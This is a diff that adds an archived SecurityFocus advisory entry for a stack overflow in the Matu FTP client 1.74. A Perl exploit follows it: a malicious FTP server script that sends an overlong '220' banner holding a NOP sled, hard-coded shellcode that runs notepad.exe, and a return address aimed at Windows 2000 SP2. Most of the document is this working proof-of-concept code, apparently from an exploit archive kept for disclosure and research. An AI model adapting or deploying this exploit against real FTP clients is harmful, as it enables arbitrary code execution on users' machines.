@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/4572/info
+
+An issue has been reported which could allow for a malicious ftp server to execute arbitrary code on a Matu FTP client. 
+
+If,upon user connection, a FTP server '220' response is of excessive length, a stack-based overflow condition could occur. This overflow could overwrite stack variables and be used to execute arbitrary code. However, sending random data could cause the application to crash.
+
+
+pwd
+#!/usr/local/bin/perl
+
+#------------------------------------------------------------------------
+# Matu Ftp Version 1.74 exploit for Windows2000 Professional (SP2)
+# ( run under inetd )
+# written by Kanatoko <anvil@jumperz.net>
+# http://www.jumperz.net/
+#------------------------------------------------------------------------
+$|=1;
+
+        #egg written by UNYUN (http://www.shadowpenguin.org/)
+$egg  = "\xEB\x27\x8B\x34\x24\x33\xC9\x33\xD2\xB2";
+$egg .= "\x0B\x03\xF2\x88\x0E\x2B\xF2\xB8\xAF\xA7";
+$egg .= "\xE6\x77\xB1\x05\xB2\x04\x2B\xE2\x89\x0C";
+$egg .= "\x24\x2B\xE2\x89\x34\x24\xFF\xD0\x90\xEB";
+$egg .= "\xFD\xE8\xD4\xFF\xFF\xFF";
+$egg .= "notepad.exe";
+
+        #egg_address = 0x0012F43C
+$buf = "\x90" x 217;
+$buf .= $egg;
+$buf .= "A" x 2;
+$buf .= "\x3C\xF4\x12\x00";
+$buf .= "B" x 80;
+
+print "220 $buf\r\n";
